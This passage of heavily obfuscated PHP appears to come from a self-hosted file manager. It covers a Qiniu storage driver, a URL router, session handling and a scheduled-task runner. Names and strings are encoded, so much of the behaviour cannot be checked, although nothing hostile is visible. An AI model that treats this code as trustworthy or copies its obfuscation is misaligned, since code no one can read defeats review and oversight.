$¿¶ÌÒÆ[1501], !1, $š—·”®¼); return $úŞÑ©‹[$¿¶ÌÒÆ[832]] ? $úŞÑ©‹[$¿¶ÌÒÆ[1292]] : !1; } public function upload($ß›‹åÌ¢, $× ¯Êñ×, $˜¯±Ë´à = false, $¤¬êù´è = REPEAT_REPLACE) { $ŒàÑø³ë = new Qiniu\Storage\UploadManager(); $‘ ­¬Ëù = $this->auth->uploadToken($this->bucket, $ß›‹åÌ¢); $æøåøÁ´ = get_file_mime(get_path_ext($× ¯Êñ×)); list($Ï©ò¸¶Á, $ã ãŞ…Ï) = $ŒàÑø³ë->putFile($‘ ­¬Ëù, $ß›‹åÌ¢, $× ¯Êñ×, null, $æøåøÁ´); return $ã ãŞ…Ï ? !1 : $this->getPathOuter($ß›‹åÌ¢); } public function uploadFormData($­ŠÒÕûü, $„àşÎ¹ö = 3600) { return $this->uploadToken($­ŠÒÕûü, $„àşÎ¹ö); } public function uploadMultiData($¤ô‡Ò€Ö, $†˜¶İûª = 3600) { return $this->uploadToken($¤ô‡Ò€Ö, $†˜¶İûª); } private function uploadToken($‘¾’•ôø, $—ªˆ“Ñí = 3600) { $ûçÀ—ìü =& $_SERVER[¼èá¯æÙ]; $™²ßÔŸí = $—ªˆ“Ñí; $„Ãé¶ı = array($ûçÀ—ìü[1542] => $ûçÀ—ìü[1543]); $¡ßÏÚ = $‘¾’•ôø; $¢ÚáÛ¢¬ = $this->auth->uploadToken($this->bucket, $¡ßÏÚ, $™²ßÔŸí, $„Ãé¶ı, !0); $ÚÉÆš‘ = empty($this->region) || $this->region == $ûçÀ—ìü[1544] ? $ûçÀ—ìü[12] : $ûçÀ—ìü[473] . $this->region; $¬®½£Æã = http_type() . "\x3a\x2f\x2f\165\x70\154\x6f\x61\x64{$ÚÉÆš‘}\56\161\151\156\x69\x75\160\x2e\143\157\155\x2f"; return array($ûçÀ—ìü[1545] => $¢ÚáÛ¢¬, $ûçÀ—ìü[1546] => $¬®½£Æã); } public function download($ïğÜ˜êí, $ı÷£³¢) { $Í”·‡é = IO::getPathInner(IO::mkfile($ı÷£³¢)); if (!($¢ Í±™Ú = $this->link($ïğÜ˜êí))) { return !1; } $›¢·šæÂ = 0; $Ôü´ö®æ = 1024 * 200; $«¨àæƒë = fopen($Í”·‡é, $_SERVER[¼èá¯æÙ][1547]); while (!0) { $ÌµŒ‘í = $this->fileSubstr($ïğÜ˜êí, $›¢·šæÂ, $Ôü´ö®æ); if ($ÌµŒ‘í === !1) { return !1; } fwrite($«¨àæƒë, $ÌµŒ‘í); $›¢·šæÂ += $Ôü´ö®æ; if (strlen($ÌµŒ‘í) < $Ôü´ö®æ) { break; } } fclose($«¨àæƒë); return $ı÷£³¢; } public function link($›ä—Îß·, $¨¼ÖÏ˜Í = '') { if (!$this->isFile($›ä—Îß·)) { return !1; } $ö©šÚ€è = $this->getHost() . $_SERVER[¼èá¯æÙ][8] . $this->pathEncode($›ä—Îß·) . $¨¼ÖÏ˜Í; return $this->auth->privateDownloadUrl($ö©šÚ€è, 3600 * 12); } public function fileOut($Å¸¸«Ÿµ, $ÈÎŞÉƒÙ = false, $ôÃù‚³· = false, $¡óçŸ¸ = '') { $‰Şé•²­ =& $_SERVER[¼èá¯æÙ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Å¸¸«Ÿµ, $ÈÎŞÉƒÙ, $ôÃù‚³·, $¡óçŸ¸); } if (!$ôÃù‚³·) { $ôÃù‚³· = $this->pathThis($Å¸¸«Ÿµ); } $¡ÛÛµê = $ÈÎŞÉƒÙ ? $‰Şé•²­[1548] . rawurlencode($ôÃù‚³·) : $‰Şé•²­[12]; $á¶­ºÙÔ = $this->link($Å¸¸«Ÿµ, $¡ÛÛµê); $this->fileOutLink($á¶­ºÙÔ); } public function fileOutServer($ÁÕ‡îçœ, $ƒ‚½êâ½ = false, $¼‘ïÂä = false, $†ÅË¿ı = '') { parent::fileOut($ÁÕ‡îçœ, $ƒ‚½êâ½, $¼‘ïÂä, $†ÅË¿ı); } public function fileOutImage($Ïì“ÀÍ², $Úšü©àê = 250) { if ($this->size($Ïì“ÀÍ²) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ïì“ÀÍ², $Úšü©àê); } $¦İÀ¹Ûñ = $this->link($Ïì“ÀÍ², $_SERVER[¼èá¯æÙ][1549] . $Úšü©àê); $this->fileOutLink($¦İÀ¹Ûñ); } public function fileOutImageServer($åööçŠğ, $ËÂ©è›  = 250) { parent::fileOutImage($åööçŠğ, $ËÂ©è› ); } public function hashMd5($§œßœŒ) { $ƒş£î£Õ =& $_SERVER[¼èá¯æÙ]; $ù˜ÍÅŠƒ = $this->objectMeta($§œßœŒ); return isset($ù˜ÍÅŠƒ[$ƒş£î£Õ[257]]) ? $ù˜ÍÅŠƒ[$ƒş£î£Õ[257]] : !1; $äÂôğÖµ = $this->link($§œßœŒ, $ƒş£î£Õ[1550]); } public function size($‘õ†ÖÑ‘) { $±èó×ØÎ = $this->objectMeta($‘õ†ÖÑ‘); return $±èó×ØÎ ? $±èó×ØÎ[$_SERVER[¼èá¯æÙ][89]] : 0; } public function info($™Ñœ¯¾) { if ($this->isFolder($™Ñœ¯¾)) { return $this->folderInfo($™Ñœ¯¾); } else { if ($this->isFile($™Ñœ¯¾)) { return $this->fileInfo($™Ñœ¯¾); } } return !1; } public function exist($Õ®›ø) { return $this->isFile($Õ®›ø) || $this->isFolder($Õ®›ø); } public function isFile($º¢˜İòƒ) { return !$this->isFolder($º¢˜İòƒ) && $this->objectMeta($º¢˜İòƒ); } public function isFolder($ä±… ‘) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][189], $ä±… ‘); } protected function objectMeta($˜ñ¯öÅé) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][191], $˜ñ¯öÅé); } protected function _objectMeta($¢ŠÄ°©³) { $°è‹â‘ =& $_SERVER[¼èá¯æÙ]; list($ĞŸôØ˜ö, $’æ“Ëì£) = $this->bucketManager->stat($this->bucket, $¢ŠÄ°©³); if ($ĞŸôØ˜ö) { $ĞŸôØ˜ö[$°è‹â‘[89]] = intval($ĞŸôØ˜ö[$°è‹â‘[1536]]); } return $ĞŸôØ˜ö; } protected function _isFolder($®²£óó) { $Ñ‚ıÓ›¢ =& $_SERVER[¼èá¯æÙ]; if ($®²£óó == $Ñ‚ıÓ›¢[12] || $®²£óó == $Ñ‚ıÓ›¢[8]) { return !0; } list($»¤ãª‚, $ù¬½í©š) = $this->bucketManager->listFiles($this->bucket, trim($®²£óó, $Ñ‚ıÓ›¢[8]) . $Ñ‚ıÓ›¢[8], $Ñ‚ıÓ›¢[12], 1, $Ñ‚ıÓ›¢[8]); return !empty($»¤ãª‚[$Ñ‚ıÓ›¢[1539]]) || !empty($»¤ãª‚[$Ñ‚ıÓ›¢[1540]]) ? !0 : !1; } } goto Eô»İ­Ï·‚; CÅ£Ûğ³øÈ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\x2f\135\53", "\x3a\156\165\155" => "\x5b\60\x2d\x39\x5d\53", "\x3a\x61\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($ŠŠÑ§„, $ÊÖûÚ”²) { $ µê¬¹‘ =& $_SERVER[¼èá¯æÙ]; if ($ŠŠÑ§„ == $ µê¬¹‘[1713]) { $¯úÄİ” = array_map($ µê¬¹‘[1714], $ÊÖûÚ”²[0]); $Î°øóš = strpos($ÊÖûÚ”²[1], $ µê¬¹‘[8]) === 0 ? $ÊÖûÚ”²[1] : $ µê¬¹‘[8] . $ÊÖûÚ”²[1]; $¿½¾®¾œ = $ÊÖûÚ”²[2]; } else { $¯úÄİ” = null; $Î°øóš = strpos($ÊÖûÚ”²[0], $ µê¬¹‘[8]) === 0 ? $ÊÖûÚ”²[0] : $ µê¬¹‘[8] . $ÊÖûÚ”²[0]; $¿½¾®¾œ = $ÊÖûÚ”²[1]; } array_push(self::$maps, $¯úÄİ”); array_push(self::$routes, $Î°øóš); array_push(self::$methods, strtoupper($ŠŠÑ§„)); array_push(self::$callbacks, $¿½¾®¾œ); } public static function error($¶ºŠµÛ) { self::$errorCallback = $¶ºŠµÛ; } public static function haltOnMatch($šŞ´Âî = true) { self::$halts = $šŞ´Âî; } public static function dispatch() { $¼Ö÷¦ =& $_SERVER[¼èá¯æÙ]; $å¾·ÓûÕ = parse_url($_SERVER[$¼Ö÷¦[1715]], PHP_URL_PATH); $™Õï™ÆÄ = $_SERVER[$¼Ö÷¦[174]]; $¾¹”Èêå = array_keys(static::$patterns); $¦ƒÙ¦–¬ = array_values(static::$patterns); $«„™ƒã¿ = !1; self::$routes = preg_replace($¼Ö÷¦[1366], $¼Ö÷¦[8], self::$routes); if (in_array($å¾·ÓûÕ, self::$routes)) { $“°áÇ£ = array_keys(self::$routes, $å¾·ÓûÕ); foreach ($“°áÇ£ as $Äˆ³Š ) { if (self::$methods[$Äˆ³Š ] == $™Õï™ÆÄ || self::$methods[$Äˆ³Š ] == $¼Ö÷¦[1716] || in_array($™Õï™ÆÄ, self::$maps[$Äˆ³Š ])) { $«„™ƒã¿ = !0; if (!is_object(self::$callbacks[$Äˆ³Š ])) { $´ÀÏÒÍ§ = explode($¼Ö÷¦[8], self::$callbacks[$Äˆ³Š ]); $¦à íÚç = end($´ÀÏÒÍ§); $‡±¯üæ = explode($¼Ö÷¦[1298], $¦à íÚç); $ËŸ…åğÅ = new $‡±¯üæ[0](); $ËŸ…åğÅ->{$‡±¯üæ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Äˆ³Š ]); if (self::$halts) { return; } } } } } else { $îë«± = 0; foreach (self::$routes as $Äˆ³Š ) { if (strpos($Äˆ³Š , $¼Ö÷¦[4]) !== !1) { $Äˆ³Š  = str_replace($¾¹”Èêå, $¦ƒÙ¦–¬, $Äˆ³Š ); } if (preg_match($¼Ö÷¦[1717] . $Äˆ³Š  . $¼Ö÷¦[1718], $å¾·ÓûÕ, $©ç‘…™ì)) { if (self::$methods[$îë«±] == $™Õï™ÆÄ || self::$methods[$îë«±] == $¼Ö÷¦[1716] || !empty(self::$maps[$îë«±]) && in_array($™Õï™ÆÄ, self::$maps[$îë«±])) { $«„™ƒã¿ = !0; array_shift($©ç‘…™ì); if (!is_object(self::$callbacks[$îë«±])) { $´ÀÏÒÍ§ = explode($¼Ö÷¦[8], self::$callbacks[$îë«±]); $¦à íÚç = end($´ÀÏÒÍ§); $‡±¯üæ = explode($¼Ö÷¦[1298], $¦à íÚç); $ËŸ…åğÅ = new $‡±¯üæ[0](); if (!method_exists($ËŸ…åğÅ, $‡±¯üæ[1])) { echo $¼Ö÷¦[1719]; } else { call_user_func_array(array($ËŸ…åğÅ, $‡±¯üæ[1]), $©ç‘…™ì); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$îë«±], $©ç‘…™ì); if (self::$halts) { return; } } } } $îë«±++; } } if ($«„™ƒã¿ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ß¬Úâ‘ =& $_SERVER[¼èá¯æÙ]; header($_SERVER[$ß¬Úâ‘[1720]] . $ß¬Úâ‘[1721]); echo $ß¬Úâ‘[1722]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¼Ö÷¦[1715]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ œºÇà“ =& $_SERVER[¼èá¯æÙ]; static $¾™æÔ£ = false; if ($¾™æÔ£) { return $¾™æÔ£; } $™Ù§Ë•í = $GLOBALS[$ œºÇà“[6]][$ œºÇà“[436]]; self::$sessionTime = $™Ù§Ë•í[$ œºÇà“[1723]]; $œ›¬Ê—æ = isset($GLOBALS[$ œºÇà“[1724]]) ? $GLOBALS[$ œºÇà“[1724]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($œ›¬Ê—æ)) { self::$sessionSign = Cookie::get($œ›¬Ê—æ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($œ›¬Ê—æ, self::$sessionSign, self::$sessionTime); $ºÂÕ—³ë = $™Ù§Ë•í[$ œºÇà“[1725]]; $ª‰·™ù‰ = $™Ù§Ë•í[$ºÂÕ—³ë]; $±£ò×Ğë = $™Ù§Ë•í[$ œºÇà“[910]]; switch ($ºÂÕ—³ë) { case $ œºÇà“[21]: self::$handle = Model($ œºÇà“[911]); break; case $ œºÇà“[912]: self::$handle = new CacheRedis($ª‰·™ù‰, $±£ò×Ğë); break; case $ œºÇà“[913]: self::$handle = new CacheMemcached($ª‰·™ù‰, $±£ò×Ğë); break; case $ œºÇà“[242]: $ª‰·™ù‰[$ œºÇà“[97]] = $ª‰·™ù‰[$ œºÇà“[97]] . $ œºÇà“[1726]; self::$handle = new CacheFile($ª‰·™ù‰, $±£ò×Ğë); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¾™æÔ£ = new self(); return $¾™æÔ£; } public static function getBySign($úËÖ¹ÅÜ) { $ªãß½®à = self::$handle->get($úËÖ¹ÅÜ); $ªãß½®à = unserialize($ªãß½®à); return is_array($ªãß½®à) ? $ªãß½®à : array(); } public static function setBySign($ØÇ·‰Àü, $ã•ñ•¡¸) { CacheLock::lock($ØÇ·‰Àü); self::$handle->set($ØÇ·‰Àü, serialize($ã•ñ•¡¸), self::$sessionTime); CacheLock::unlock($ØÇ·‰Àü); } public static function sign($ °¾ƒœ§ = false) { if ($ °¾ƒœ§) { self::$sessionSign = $ °¾ƒœ§; } self::init(); return self::$sessionSign; } public static function set($¡È’È, $ÎÈ²ìé = false) { self::init(); if (is_array($¡È’È)) { foreach ($¡È’È as $”‰·É¨ê => $Ä«Ö²ôÔ) { array_set_value(self::$data, $”‰·É¨ê, $Ä«Ö²ôÔ); } } else { array_set_value(self::$data, $¡È’È, $ÎÈ²ìé); } self::setBySign(self::$sessionSign, self::$data); } public static function get($µ¹¿ÎÉØ = false) { self::init(); if (!$µ¹¿ÎÉØ) { return self::$data; } return array_get_value(self::$data, $µ¹¿ÎÉØ); } public static function remove($ôÊ¡áòå) { self::init(); unset(self::$data[$ôÊ¡áòå]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¼èá¯æÙ][916])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $çäö³¼ =& $_SERVER[¼èá¯æÙ]; if (self::valueGet($çäö³¼[832]) != $çäö³¼[101]) { return; } if (self::valueGet($çäö³¼[1727]) == $çäö³¼[101]) { $¢ê¹ÖÜ = self::valueGet($çäö³¼[1728]); if (time() - $¢ê¹ÖÜ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($çäö³¼[1727], $çäö³¼[101]); self::log($çäö³¼[1729] . ACTION . $çäö³¼[1730]); Hook::bind($çäö³¼[1731], $çäö³¼[1732]); $ûÎ¶¢ù© = 0; while (!0) { self::cacheClear(); if (self::valueGet($çäö³¼[832]) != $çäö³¼[101]) { self::valueSet($çäö³¼[1727], $çäö³¼[240]); self::log($çäö³¼[1733]); die; } $·ùë¶· = time(); if ($·ùë¶· - $ûÎ¶¢ù© >= 60) { self::valueSet(array($çäö³¼[1727] => $çäö³¼[101], $çäö³¼[1728] => $·ùë¶·)); $ûÎ¶¢ù© = $·ùë¶·; } if (!file_exists(USER_SYSTEM . $çäö³¼[1734])) { self::valueSet(array($çäö³¼[1727] => $çäö³¼[240], $çäö³¼[832] => $çäö³¼[240])); self::log($çäö³¼[1735]); die; } $İß†ŒèŸ = file_get_contents(BASIC_PATH . $çäö³¼[1736]); $¬â…Şãî = KOD_VERSION . $çäö³¼[10] . KOD_VERSION_BUILD; $˜Ï•‘Ë = match_text($İß†ŒèŸ, $çäö³¼[1737]) . $çäö³¼[10] . match_text($İß†ŒèŸ, $çäö³¼[1738]); if ($˜Ï•‘Ë != $¬â…Şãî) { self::restart(); self::log("\x73\164\x6f\160\145\144\56\x5b\166\x65\x72\x73\151\x6f\x6e\40\x75\160\x64\x61\164\145\x3b{$versionNow}\x20\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $’ì‰ó¥© =& $_SERVER[¼èá¯æÙ]; http_close(); $GLOBALS[$’ì‰ó¥©[1739]] = 1; $_SERVER[$’ì‰ó¥©[1740]] = $’ì‰ó¥©[1741]; $_COOKIE = array(); $GLOBALS[$’ì‰ó¥©[1742]] = 1; $GLOBALS[$’ì‰ó¥©[1743]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ë½›»ûã =& $_SERVER[¼èá¯æÙ]; http_close(); self::valueSet($ë½›»ûã[832], $ë½›»ûã[240]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ë½›»ûã[1727] => $ë½›»ûã[240], $ë½›»ûã[832] => $ë½›»ûã[101])); self::log($ë½›»ûã[1744]); } public static function taskSwitch() { $Ô€¶î¡ =& $_SERVER[¼èá¯æÙ]; $»èí‹°ï = self::valueGet($Ô€¶î¡[832]) == $Ô€¶î¡[101] ? $Ô€¶î¡[240] : $Ô€¶î¡[101]; self::valueSet($Ô€¶î¡[832], $»èí‹°ï); } public static function shutdownEvent() { $Î·¹ëŒ =& $_SERVER[¼èá¯æÙ]; self::valueSet($Î·¹ëŒ[1727], $Î·¹ëŒ[240]); self::log($Î·¹ëŒ[1745]); } public static function config($õ‚œ¯÷’, $ÎƒÅµ½) { self::valueSet($_SERVER[¼èá¯æÙ][832], $õ‚œ¯÷’); } private static function taskRunAll() { $Ïß¥– =& $_SERVER[¼èá¯æÙ]; $¡ˆ¨æŠÚ = timeFloat(); $¬‡³³¼Î = Model($Ïß¥–[1746])->listData(); $ìÓ™€“Ç = count($¬‡³³¼Î); for ($ÎèçÊ³¤ = 0; $ÎèçÊ³¤ < $ìÓ™€“Ç; $ÎèçÊ³¤++) { $åõ‰¦õ† = $¬‡³³¼Î[$ÎèçÊ³¤]; if (!$åõ‰¦õ†[$Ïß¥–[486]] || $åõ‰¦õ†[$Ïß¥–[1747]] != $Ïß¥–[101]) { continue; } if (!self::taskTimeCheck($åõ‰¦õ†)) { continue; } self::taskRun($åõ‰¦õ†); } Hook::trigger($Ïß¥–[1748]); self::taskQueueRun($¡ˆ¨æŠÚ); } private static function taskQueueRun($ï¾¬ŒÚ›) { $µÆ§Šõ± = 10; while (!0) { $¿°­†äê = TaskQueue::run(); if ($¿°­†äê === !1) { break; } if (timeFloat() - $ï¾¬ŒÚ› >= $µÆ§Šõ±) { break; } } } private static function taskTimeCheck($‰…¹¸éÖ) { $¼€–§‚ğ =& $_SERVER[¼èá¯æÙ]; $«ê®ØÄÜ = json_decode($‰…¹¸éÖ[$¼€–§‚ğ[216]], !0); $½¿„Ú÷ = intval($‰…¹¸éÖ[$¼€–§‚ğ[1728]]); $­ÄàÈÅ = strtotime($¼€–§‚ğ[1749] . $«ê®ØÄÜ[$¼€–§‚ğ[1750]] . $¼€–§‚ğ[1751]) - strtotime($¼€–§‚ğ[1752]); $ ç“¼ Ñ = time() - strtotime(date($¼€–§‚ğ[1753]) . $¼€–§‚ğ[1754]); $ª‡ïäã = $ ç“¼ Ñ >= $­ÄàÈÅ && $ ç“¼ Ñ <= $­ÄàÈÅ + 3600; switch ($«ê®ØÄÜ[$¼€–§‚ğ[33]]) { case $¼€–§‚ğ[1755]: if (time() - $½¿„Ú÷ < 3600 * 24 * 30) { return !1; } if ($«ê®ØÄÜ[$¼€–§‚ğ[1755]] == date($¼€–§‚ğ[1756]) && $ª‡ïäã) { return !0; } break; case $¼€–§‚ğ[1757]: if (time() - $½¿„Ú÷ < 3600 * 24 * 7) { return !1; } $‹¡ãè¶é = date($¼€–§‚ğ[1758]) == 0 ? 7 : date($¼€–§‚ğ[1758]); if ($«ê®ØÄÜ[$¼€–§‚ğ[1757]] == $‹¡ãè¶é && $ª‡ïäã) { return !0; } break; case $¼€–§‚ğ[1750]: if (time() - $½¿„Ú÷ < 3600 * 24) { return !1; } if ($ª‡ïäã) { return !0; } break; case $¼€–§‚ğ[1759]: if (time() - $½¿„Ú÷ >= floatval($«ê®ØÄÜ[$¼€–§‚ğ[1759]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $±ÛãË¤ =& $_SERVER[¼èá¯æÙ]; static $’ïÓ‡Ï¶ = 0; $¸®Îôà = 300; if (!$’ïÓ‡Ï¶) { $’ïÓ‡Ï¶ = time(); } if (time() - $’ïÓ‡Ï¶ < $¸®Îôà) { return; } $’ïÓ‡Ï¶ = time(); $×›óğÇ = Model($±ÛãË¤[588])->db($±ÛãË¤[12]); if ($×›óğÇ) { $×›óğÇ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($±ÛãË¤[1760], $±ÛãË¤[1761]); die; } } public static function taskRun($“Š¯æøç) { $¾Õ„ßÄ =& $_SERVER[¼èá¯æÙ]; self::log($¾Õ„ßÄ[1762] . $“Š¯æøç[$¾Õ„ßÄ[486]] . $¾Õ„ßÄ[1763] . $“Š¯æøç[$¾Õ„ßÄ[32]] . $¾Õ„ßÄ[1764] . $“Š¯æøç[$¾Õ„ßÄ[1765]]); Model($¾Õ„ßÄ[1746])->run($“Š¯æøç[$¾Õ„ßÄ[486]]); $ôìÉ†­ = timeFloat(); $€Œ§Á‘  = $¾Õ„ßÄ[12]; switch ($“Š¯æøç[$¾Õ„ßÄ[33]]) { case $¾Õ„ßÄ[394]: $èßçƒ— = url_request($“Š¯æøç[$¾Õ„ßÄ[1765]], $¾Õ„ßÄ[1501], !1, !1, !1, !1, 10); if ($èßçƒ—[$¾Õ„ßÄ[832]]) { $€Œ§Á‘  = strlen($èßçƒ—[$¾Õ„ßÄ[1292]]); } break; case $¾Õ„ßÄ[1766]: $€Œ§Á‘  = Hook::apply($“Š¯æøç[$¾Õ„ßÄ[1765]]); default: break; } Model($¾Õ„ßÄ[1767])->add(array($¾Õ„ßÄ[1768] => $¾Õ„ßÄ[12], $¾Õ„ßÄ[1769] => $¾Õ„ßÄ[240], $¾Õ„ßÄ[33] => $¾Õ„ßÄ[1770] . $“Š¯æøç[$¾Õ„ßÄ[486]], $¾Õ„ßÄ[1771] => json_encode(array($¾Õ„ßÄ[32] => $“Š¯æøç[$¾Õ„ßÄ[32]], $¾Õ„ßÄ[1772] => timeFloat() - $ôìÉ†­, $¾Õ„ßÄ[380] => $€Œ§Á‘ )))); $ö’†§âø = $€Œ§Á‘  ? $¾Õ„ßÄ[1773] . $€Œ§Á‘  : $¾Õ„ßÄ[12]; self::log($¾Õ„ßÄ[1774] . $“Š¯æøç[$¾Õ„ßÄ[486]] . $¾Õ„ßÄ[188] . $ö’†§âø); return !0; } public static function valueGet($ĞŞÎ¤ô§) { $ßÍã—²Š =& $_SERVER[¼èá¯æÙ]; $î­Ÿİèø = $ßÍã—²Š[1775]; $¤©§Š½à = Model($ßÍã—²Š[519])->get($ĞŞÎ¤ô§, $î­Ÿİèø); if (is_null($¤©§Š½à)) { Model($ßÍã—²Š[519])->set($ßÍã—²Š[832], $ßÍã—²Š[101], $î­Ÿİèø); Model($ßÍã—²Š[519])->set($ßÍã—²Š[1727], $ßÍã—²Š[240], $î­Ÿİèø); $¤©§Š½à = Model($ßÍã—²Š[519])->get($ĞŞÎ¤ô§, $î­Ÿİèø); } return $¤©§Š½à; } private static function valueSet($Ç”ÉçÌÀ, $ĞœññŸ = false) { $™ü€¶õ =& $_SERVER[¼èá¯æÙ]; $…¬¡óö = $™ü€¶õ[1776]; CacheLock::lock($…¬¡óö); $¼Ş¾«€´ = Model($™ü€¶õ[519])->set($Ç”ÉçÌÀ, $ĞœññŸ, $™ü€¶õ[1775]); CacheLock::unlock($…¬¡óö); return $¼Ş¾«€´; } protected static function log($¼°è´Ú¼) { write_log($¼°è´Ú¼, $_SERVER[¼èá¯æÙ][1761]); } private static function cacheClear() { $‚â³Áüã =& $_SERVER[¼èá¯æÙ]; Cache::clearMemory(Model($‚â³Áüã[519])->cacheKey($‚â³Áüã[1775])); Cache::clearMemory(Model($‚â³Áüã[519])->cacheKey($‚â³Áüã[1777])); Model($‚â³Áüã[1746])->cacheClear(); self::closeDatabase(); } } goto e…ó‚ÅØêÕ; bæ˜ñ¨¾Óø: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($£±–šäã) { $³…ìù“œ =& $_SERVER[¼èá¯æÙ]; return array($³…ìù“œ[2094] => array($³…ìù“œ[2521] . USER_ID, $³…ìù“œ[2095])); } protected function listData() { $Ô‚½É¨ä =& $_SERVER[¼èá¯æÙ]; $„ÕÌ”×Ñ = array($Ô‚½É¨ä[1769] => USER_ID, $Ô‚½É¨ä[568] => array($Ô‚½É¨ä[2098], 0)); $¬à°†² = $Ô‚½É¨ä[2522]; $æİÄ£ö = $this->field($¬à°†²)->where($„ÕÌ”×Ñ)->order($Ô‚½É¨ä[2101])->select(); return $æİÄ£ö ? $æİÄ£ö : array(); } protected function addToTag($ŒÓÕ‡äÇ, $š¥±Ç¢Æ) { $Ö¯ö°„È =& $_SERVER[¼èá¯æÙ]; if (!Model($Ö¯ö°„È[2250])->listData($š¥±Ç¢Æ)) { return !1; } if (is_numeric($ŒÓÕ‡äÇ)) { $ ÊáİÁÑ = Model($Ö¯ö°„È[907])->pathInfo($ŒÓÕ‡äÇ); if (!$ ÊáİÁÑ) { return !1; } } else { $ ÊáİÁÑ = IO::infoSimple($ŒÓÕ‡äÇ); if (!$ ÊáİÁÑ) { return !1; } $ÀËéæöÅ = $ ÊáİÁÑ[$Ö¯ö°„È[32]]; $ˆÌâ–±• = $ ÊáİÁÑ[$Ö¯ö°„È[33]]; if (isset($ ÊáİÁÑ[$Ö¯ö°„È[496]])) { $ˆÌâ–±• = $ ÊáİÁÑ[$Ö¯ö°„È[496]] == $Ö¯ö°„È[101] ? $Ö¯ö°„È[88] : $Ö¯ö°„È[242]; } } $ÕÜãíÕ = array($Ö¯ö°„È[1769] => USER_ID, $Ö¯ö°„È[568] => $š¥±Ç¢Æ, $Ö¯ö°„È[506] => $ŒÓÕ‡äÇ, $Ö¯ö°„È[507] => $ˆÌâ–±• ? $ˆÌâ–±• : $Ö¯ö°„È[501], $Ö¯ö°„È[505] => $ÀËéæöÅ ? $ÀËéæöÅ : $Ö¯ö°„È[12], $Ö¯ö°„È[1983] => 0); if ($this->where($ÕÜãíÕ)->find()) { return !1; } return $this->add($ÕÜãíÕ); } protected function removeFromTag($€ù¸»Â, $ÔÎõÜÁ²) { $îøªƒ© =& $_SERVER[¼èá¯æÙ]; if (!Model($îøªƒ©[2250])->listData($ÔÎõÜÁ²)) { return !1; } if (is_array($€ù¸»Â)) { $€ù¸»Â = array($îøªƒ©[7], $€ù¸»Â); } $š»å = array($îøªƒ©[1769] => USER_ID, $îøªƒ©[568] => $ÔÎõÜÁ², $îøªƒ©[506] => $€ù¸»Â); return $this->where($š»å)->delete(); } protected function removeByTag($²ß£¡¢Ğ) { $é‹”ã =& $_SERVER[¼èá¯æÙ]; if (!$²ß£¡¢Ğ) { return !1; } $†ï«ñÕ¸ = array($é‹”ã[1769] => USER_ID, $é‹”ã[568] => $²ß£¡¢Ğ); return $this->where($†ï«ñÕ¸)->delete(); } protected function removeBySource($Ö˜Ú¿) { $×¼ÕÖ£Ø =& $_SERVER[¼èá¯æÙ]; if (is_array($Ö˜Ú¿)) { $Ö˜Ú¿ = array($×¼ÕÖ£Ø[7], $Ö˜Ú¿); } $ıßÈ»üˆ = array($×¼ÕÖ£Ø[1769] => USER_ID, $×¼ÕÖ£Ø[568] => array($×¼ÕÖ£Ø[1096], 0), $×¼ÕÖ£Ø[506] => $Ö˜Ú¿); return $this->where($ıßÈ»üˆ)->delete(); } }